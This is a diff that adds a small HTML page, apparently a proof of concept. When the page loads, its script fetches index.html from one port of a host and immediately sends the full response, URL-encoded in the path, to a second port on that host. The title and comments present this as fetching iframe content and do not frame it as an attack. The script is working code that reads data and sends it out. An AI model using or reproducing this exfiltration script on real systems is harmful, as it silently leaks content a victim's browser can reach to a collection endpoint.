@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Fetching Iframe Content with Axios</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+      // Global variable to store the response
+      var responseData = '';
+
+      // Function to make the second request with the updated response
+      function makeSecondRequest() {
+        axios.get('http://home.anaskhan.site:1314/' + encodeURIComponent(responseData))
+          .then(function (response) {
+            console.log('Second request successful:', response);
+          })
+          .catch(function (error) {
+            console.error('Error making second request:', error);
+          });
+      }
+
+      // Function to make the first request and update the response
+      function makeFirstRequest() {
+        axios.get('http://home.anaskhan.site:1313/index.html')
+          .then(function (response) {
+            responseData = response.data;
+            console.log('First request successful:', responseData);
+            makeSecondRequest(); // Make the second request after updating the response
+          })
+          .catch(function (error) {
+            console.error('Error fetching iframe content:', error);
+          });
+      }
+
+      // Call the function to make the first request
+      makeFirstRequest();
+    </script>
+  </head>
+  <body>
+    <!-- The fetched content will be used to make a second request to http://home.anaskhan.site:1314/ -->
+  </body>
+</html>
